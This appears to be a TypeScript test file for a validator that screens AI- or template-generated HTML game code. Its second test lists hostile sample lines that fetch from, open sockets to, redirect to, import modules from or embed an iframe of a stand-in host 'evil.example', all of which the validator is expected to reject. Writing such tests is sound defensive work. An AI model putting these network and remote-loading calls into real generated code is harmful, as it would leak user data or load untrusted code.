import assert from "node:assert/strict";
import { test } from "node:test";
import { GAME_TYPES, generateGameOffline, validateGameCode } from "./index";

test("every built-in game type passes the hardened validator", () => {
  for (const meta of GAME_TYPES) {
    const game = generateGameOffline(`make a ${meta.id} game`, meta.id);
    const result = validateGameCode(game.code);
    assert.equal(result.ok, true, `${meta.id}: ${JSON.stringify(result)}`);
  }
});

test("validator rejects network, navigation and embedding primitives", () => {
  const wrap = (body: string) => `<!doctype html><html><body><canvas></canvas><script>${body}</script></body></html>`;
  const bad = [
    'fetch("https://evil.example/x")',
    'new XMLHttpRequest()',
    'new WebSocket("wss://evil.example")',
    'navigator.sendBeacon("/x")',
    'window.open("https://evil.example")',
    'top.location = "https://evil.example"',
    'location.href = "https://evil.example"',
    'import("https://evil.example/m.js")',
    'importScripts("x.js")',
  ];
  for (const code of bad) {
    assert.equal(validateGameCode(wrap(code)).ok, false, code);
  }
  assert.equal(validateGameCode('<html><body><canvas></canvas><iframe src="https://evil.example"></iframe><script>1</script></body></html>').ok, false);
});
